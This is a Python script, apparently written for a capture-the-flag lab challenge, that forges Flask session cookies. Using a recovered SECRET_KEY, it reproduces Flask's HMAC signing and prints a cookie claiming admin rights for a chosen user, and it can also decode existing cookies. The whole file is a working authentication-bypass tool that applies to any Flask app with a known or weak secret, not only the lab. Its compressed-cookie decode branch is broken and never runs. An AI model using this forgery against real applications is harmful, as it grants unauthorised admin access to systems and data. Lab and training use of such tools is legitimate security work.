#!/usr/bin/env python3
"""Forge a Flask session cookie for challenge auth-weak-secret.

Pure standard library - no Flask or itsdangerous needed, so it runs against a
containerised range from any host with Python 3.

Equivalent to:
  flask-unsign --sign --cookie "{'is_admin': True}" --secret 'deliberately-weak-lab-secret'

Usage:
  python3 tools/forge_session.py --secret 'deliberately-weak-lab-secret'
  python3 tools/forge_session.py --decode '<cookie value>'
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import time

SALT = b"cookie-session"  # Flask's session serializer salt


def b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def unb64(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def derive_key(secret: str) -> bytes:
    """itsdangerous key_derivation='hmac' with digest_method=sha1, as Flask configures it."""
    return hmac.new(secret.encode(), SALT, hashlib.sha1).digest()


def int_to_bytes(number: int) -> bytes:
    return number.to_bytes((number.bit_length() + 7) // 8 or 1, "big")


def sign(payload: dict, secret: str) -> str:
    body = b64(json.dumps(payload, separators=(",", ":")).encode())
    timestamp = b64(int_to_bytes(int(time.time())))
    value = f"{body}.{timestamp}"
    signature = hmac.new(derive_key(secret), value.encode(), hashlib.sha1).digest()
    return f"{value}.{b64(signature)}"


def decode(cookie: str) -> dict:
    """Flask sessions are signed, not encrypted - anyone can read the contents."""
    body = cookie.split(".")[0]
    if body.startswith("."):  # zlib-compressed payload
        import zlib
        return json.loads(zlib.decompress(unb64(body[1:])))
    return json.loads(unb64(body))


parser = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--secret", help="recovered Flask SECRET_KEY")
parser.add_argument("--user", default="attacker", help="username to claim in the forged session")
parser.add_argument("--decode", metavar="COOKIE", help="print the contents of a session cookie")
args = parser.parse_args()

if args.decode:
    print(json.dumps(decode(args.decode), indent=2))
elif args.secret:
    print(sign({"is_admin": True, "user": args.user, "role": "admin"}, args.secret))
else:
    parser.error("pass --secret to sign a cookie, or --decode to read one")
